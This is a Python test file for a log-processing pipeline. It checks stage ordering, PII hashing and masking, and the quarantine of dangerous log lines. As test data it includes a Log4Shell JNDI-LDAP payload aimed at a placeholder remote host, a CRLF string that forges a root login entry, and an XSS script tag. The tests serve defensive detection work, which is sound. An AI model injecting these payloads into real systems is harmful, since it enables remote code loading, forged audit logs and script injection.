from app.services.pipeline.service import run_record

_LINUX_FAIL = "Sep  2 09:02:11 db-02 sshd[4412]: Failed password for admin from 192.168.1.50 port 22 ssh2"
_JSON_FAIL = '{"event":"login_failed","user":"admin","src_ip":"192.168.1.50","msg":"auth fail"}'


def test_full_stage_order_is_recorded():
    ctx = run_record(_LINUX_FAIL)
    names = [s.stage for s in ctx.stages]
    assert names == [
        "security_shield", "format_detection", "parsing", "cleaning",
        "field_extraction", "pii_obfuscation", "normalization", "validation",
    ]


def test_pii_deterministic_and_cross_source_stable():
    a = run_record(_LINUX_FAIL, pii_mode="DETERMINISTIC_HASH").event
    b = run_record(_JSON_FAIL, pii_mode="DETERMINISTIC_HASH").event
    assert a.source_ip == b.source_ip           # same pseudonym across sources
    assert a.source_ip.startswith("IP_")
    assert a.username == b.username
    assert a.username.startswith("USER_")
    assert a.pii_protected is True


def test_pii_off_leaves_values_intact():
    ev = run_record(_LINUX_FAIL, pii_mode="OFF").event
    assert ev.source_ip == "192.168.1.50"
    assert ev.username == "admin"
    assert ev.pii_protected is False


def test_pii_mask_mode():
    ev = run_record(_LINUX_FAIL, pii_mode="MASK").event
    assert ev.source_ip in ("192.168.1.x", "192.168.x.x")
    assert ev.username == "a***"


def test_weaponized_log_is_quarantined_and_not_executed():
    ctx = run_record("app: name=admin ${jndi:ldap://198.51.100.9:1389/x} result=ok")
    assert ctx.security_verdict == "WEAPONIZED_LOG"
    assert ctx.disposition == "QUARANTINED"
    assert ctx.event is None  # never normalized/stored
    assert any(i["type"] == "log4shell" for i in ctx.security_indicators)


def test_crlf_log_forging_is_quarantined():
    ctx = run_record(r'msg="fake\r\nSep  2 09:10:04 web-01 sshd[9]: Accepted password for root from 10.0.0.1 port 22 ssh2"')
    assert ctx.security_verdict in ("SUSPICIOUS", "WEAPONIZED_LOG")
    assert ctx.disposition == "QUARANTINED"


def test_recorded_attack_payload_is_flagged_but_still_processed():
    # a web log RECORDING an attack attempt - the log itself is legitimate
    line = '198.51.100.23 - - [02/Sep/2025:09:44:03 +0000] "GET /login HTTP/1.1" 403 12 "-" "Mozilla/5.0 <script>alert(1)</script>"'
    ctx = run_record(line)
    assert ctx.security_verdict == "SUSPICIOUS"
    assert ctx.disposition != "QUARANTINED"
    assert ctx.event is not None
    assert ctx.event.response_code == 403


def test_malformed_timestamp_and_ip_are_flagged_not_crashed():
    ctx = run_record("Sep 32 99:99:99 db-02 sshd[1]: Failed password for admin from 999.1.1.1 port 999999 ssh2")
    assert ctx.stages
    clean_stage = next(s for s in ctx.stages if s.stage == "cleaning")
    assert any("999.1.1.1" in w or "999999" in w for w in clean_stage.warnings)


def test_duplicate_hash_is_stable():
    a = run_record("identical line here")
    b = run_record("identical line here")
    assert a.content_hash == b.content_hash
